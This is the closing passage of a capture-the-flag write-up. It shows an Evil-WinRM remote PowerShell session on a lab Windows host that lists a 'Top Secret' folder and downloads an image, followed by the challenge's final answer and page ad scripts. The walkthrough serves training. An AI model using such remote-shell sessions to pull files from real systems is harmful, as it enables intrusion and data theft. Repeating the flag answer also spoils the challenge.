     *Evil-WinRM* PS C:\> cd "C:\Program Files\Top Secret"
     *Evil-WinRM* PS C:\Program Files\Top Secret> dir
     Directory: C:\Program Files\Top Secret


     Mode                LastWriteTime         Length Name
     ----                -------------         ------ ----
     -a----        2/25/2021  10:13 AM         449195 top_secret.png


     *Evil-WinRM* PS C:\Program Files\Top Secret> download top_secret.png
     ```

Open the image in firefox and see the text “I dont have much time […] the way to exit vim is :w”. He died before he could end his sentence, so the answer for the last question is: `:wq`.

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
